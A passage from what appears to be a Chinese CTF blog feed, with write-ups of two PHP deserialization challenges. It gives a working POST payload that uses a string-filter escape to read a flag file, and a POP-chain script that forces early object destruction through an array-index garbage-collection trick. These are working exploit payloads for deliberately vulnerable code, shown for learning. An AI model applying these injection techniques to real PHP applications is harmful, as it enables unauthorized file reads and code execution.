class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>自然地，跟着hint先去<strong>phpinfo</strong>逛一圈再说</p><p>于是乎找到个好东西</p><p><img src="/images/BUU/202203032130282.png"></p><p><strong>disable_functions</strong>本应是重点关注对象</p><p>而<strong>auto_append_file</strong>表示爷才是主角，说<code>d0g3_f1ag.php</code>会被自动<code>require</code>。</p><p>直接访问没有任何输出，应该是藏身于马桶（指源码）中了</p><p>我<code>d0g3_f1ag.php</code>是什么文件，不用我自己说，麻烦你（指<strong>phpinfo</strong>）传个话，要flag的事，让他自己跟我说（指润回去审计源码去）</p><p>精简一下写个青春版</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>其中<code>file_get_contents()</code>是通向成功的最后一步，得将办法让<code>$userinfo[&#39;img&#39;]</code>的值变成<code>ZDBnM19mMWFnLnBocA==</code>（即<code>&quot;d0g3_f1ag.php&quot;</code>的base64编码）就好了。</p><p>正常情况下<code>$userinfo[&#39;img&#39;]</code>的值来源于<code>$_GET[&#39;img_path&#39;]</code>，经过<code>sha1()</code>的调教后已经变成我们认不出的形状了（悲），因此需要想办法绕过<code>sha1()</code>，直接给<code>$_SESSION</code>赋值。</p><p>这就要用到反序列化逃逸了的说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [<span class="string">&quot;tnnd&quot;</span>, <span class="string">&quot;wsmbh&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># a:2:&#123;i:0;s:4:&quot;tnnd&quot;;i:1;s:5:&quot;wsmbh&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:2:&#123;i:0;s:4:&quot;tnnd&quot;;i:1;s:5:&quot;wsmbh&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment"># array(2) &#123; [0]=&gt; string(4) &quot;tnnd&quot; [1]=&gt; string(5) &quot;wsmbh&quot; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:2:&#123;i:0;s:4:&quot;tnnd&quot;;i:1;s:5:&quot;wsmbh&quot;;&#125;doupassshiba&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment"># array(2) &#123; [0]=&gt; string(4) &quot;tnnd&quot; [1]=&gt; string(5) &quot;wsmbh&quot; &#125;</span></span><br></pre></td></tr></table></figure><p>看来反序列化似乎是有一定识别范围的，且此范围由<code>s:</code>决定。</p><p>小验一手</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:2:&#123;i:0;s:4:&quot;tnnd&quot;;i:1;s:20:&quot;wsmbh&quot;;&#125;doupassshiba&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure><p>得到输出<code>array(2) &#123; [0]=&gt; string(4) &quot;tnnd&quot; [1]=&gt; string(20) &quot;wsmbh&quot;;&#125;doupassshiba&quot; &#125;</code>。</p><p>此时第二项的值在<code>s:20</code>的要求下应为20个字符，因此是<code>wsmbh&quot;;&#125;doupassshiba</code>，且仍以<code>&quot;;</code>结尾，符合序列化数据的结构。</p><p>有了这个思想这道题就不难了。</p><p>再认识一个函数<strong>extract()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>[<span class="string">&quot;yee&quot;</span>] = <span class="string">&quot;yeeeeeeeeeeee&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$yee</span>);</span><br><span class="line"><span class="comment"># s:13:&quot;yeeeeeeeeeeee&quot;;</span></span><br></pre></td></tr></table></figure><p><code>extract()</code>函数将数组中的键作为变量名，并赋上对应的键值。</p><p>因此我们POST传参<code>_SESSION[&#39;flagphp&#39;]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>（注意是<code>_SESSION</code>不是<code>$_SESSION</code></p><p>序列化结果<code>a:2:&#123;s:7:&quot;flagphp&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;...;&#125;</code></p><p>经过<code>fliter()</code>变成<code>a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;...;&#125;</code></p><p>这样再反序列化得到的结果就成了<code>Array ( [&quot;;s:48:] =&gt; 1 [img] =&gt; ZDBnM19mMWFnLnBocA== )</code>，成功让<code>img</code>逃逸出来，成为一个键。</p><p>由于在payload里构造了<code>;&#125;</code>结束标志，至于后面的其它数据，就统统被当成垃圾啦。</p><p>思路和各种注入类型的漏洞如出一辙呢</p><p><img src="/images/BUU/202203051400659.png"></p><p>再将base64编码的部分换成flag文件就好了 编码后长度仍然是20，直接替换就好。</p><p><img src="/images/BUU/202203051402091.png"></p><p>又学到新姿势了！好耶！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;趁热又一道&lt;strong&gt;php unserialize&lt;/strong&gt;，冲&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>卷王杯 easy unserialize | esay web</title>
    <link href="https://www.m0x01sery.com/2022/02/26/[juanwang]easy-unserialize/"/>
    <id>https://www.m0x01sery.com/2022/02/26/[juanwang]easy-unserialize/</id>
    <published>2022-02-25T16:00:00.000Z</published>
    <updated>2022-02-28T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>从这两道题学到了好多新知识的说</p><p>第一次做没做出来<del>（真的太逊了）</del>，在粟酱的博客指导下终于有了新的收获，太棒了</p><span id="more"></span><h1 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy unserialize"></a>easy unserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2022-02-01 11:25:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2022-02-07 15:08:18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./HappyYear.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function(<span class="variable">$fn</span>, <span class="variable">$prev</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;Happy_func&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;year_parm&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$talk</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$talk</span>&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="keyword">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wow you have sovled&quot;</span>.<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctfshow&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;高一新生报道&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和普通的反序列化明显不同的是，这次的<code>unserialize()</code>下面多了个<code>throw new Exception()</code></p><p>它起什么作用呢？</p><p>我们知道，启动链子用的<code>__destruct()</code>方法会在对象被销毁时调用</p><p>而这里的<code>throw new Exception()</code>简单来说就是调用php的内置<code>Exception</code>类抛出一个异常，让程序异常退出，这会阻止对象的自动销毁。得想个办法在这段代码执行之前触发<code>__destruct()</code>就好了。</p><p>因此我们得先了解了解对象将要被销毁的<strong>标志</strong>究竟是什么了</p><p><a href="https://www.php.cn/topic/php7/458933.html">php7垃圾回收机制</a></p><p><a href="https://ctfking.com/2022/020553107.html">利用PHP垃圾回收机制构造POP链</a></p><p>基于机制，除了被动等待程序结束以外还可以用以下两种方法主动触发回收</p><p><code>unset($obj);</code></p><p><code>$obj = NULL;</code></p><p>第一种执行<code>unset()</code>函数的方法在这里显然不适用，来试试第二种重引用法</p><blockquote><p>当一个对象没有任何引用的时候，则会被视为“垃圾”，即</p><p><code>$a = new obj();</code></p><p>这是一个obj对象，被a变量应用，所以它不是“垃圾”。如果是</p><p><code>new obj();</code></p><p>或</p><p><code>$a = new obj();$a = 233;</code></p><p>上面都是对象<strong>没有被引用</strong>或<strong>有了其它引用之后失去了原来的引用</strong>的情况，均会触发强制GC。</p></blockquote><p>想要在反序列化时这样操作，得再借用一下<strong>数组</strong>的力量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Aieeeeeee&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="literal">null</span>; <span class="comment"># 这里赋值可任选，选择null是因为序列化后的结果更简单</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><p>输出结果</p><p><code>a:2:&#123;i:0;O:4:&quot;Demo&quot;:0:&#123;&#125;i:1;N;&#125;</code></p><p>想要重新给<code>$a</code>赋值挤掉实例，改变数组的 下标（这样叫也许不太准确）即可</p><p><code>a:2:&#123;i:0;O:4:&quot;Demo&quot;:0:&#123;&#125;i:0;N;&#125;</code></p><p>利用数组的想法真的妙爆了！太强啦！</p><p>接下来是几个生面孔函数的蕉♂朋友环节</p><p><strong>array_walk()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wryyyyyyy</span> = <span class="string">&quot;Dio&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function(<span class="variable">$fn</span>, <span class="variable">$prev</span>)&#123;<span class="keyword">echo</span> <span class="variable">$fn</span>.<span class="string">&quot; said &quot;</span>.<span class="variable">$prev</span>;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure><p>输出<code>Dio said wryyyyyyy</code>。</p><p><strong>call_user_func()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;今晚八点我在炙热沙城Ⅱ等你&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;est&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure><p>成功输出<code>今晚八点我在炙热沙城Ⅱ等你</code>。</p><p>至此，终于可以开始愉快地审链子啦</p><p><code>one::__destruct()</code> -&gt; <code>second::__call()</code> -&gt; <code>second::addMe()</code> -&gt; <code>one::__toString()</code> -&gt; <code>third::__get()</code> -&gt; <code>one::MeMeMe()</code></p><p>哦豁，<code>one</code>跳<code>second</code>，<code>second</code>又跳<code>one</code>，用一般的链子写法似乎出现了死循环的说</p><p>这时又需要充分发挥想象力了，搓成一条链会出大问题，那就搓出两条！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year_parm</span> = <span class="keyword">array</span>(<span class="string">&quot;Happy_func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;[<span class="keyword">new</span> one, <span class="string">&quot;MeMeMe&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">second</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">third</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">object</span> = <span class="variable">$c</span>;   <span class="comment"># one::__destruct() -&gt; second::__call() -&gt; second::addMe()</span></span><br><span class="line"><span class="variable">$c</span>-&gt;filename = <span class="variable">$b</span>; <span class="comment"># second::addMe() -&gt; one::__toString()</span></span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="keyword">object</span> = <span class="variable">$d</span>;   <span class="comment"># one::__toString() -&gt; third::__get() -&gt; one::MeMeMe()</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$n</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">array</span>(<span class="variable">$a</span>, <span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><p>为了调用<code>private</code>和<code>protected</code>的属性我们不得不将它们改为<code>public</code>，好在php7在反序列化时对它并不感兴趣。因此也没有<code>urlencode()</code>的必要了。</p><p>其中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 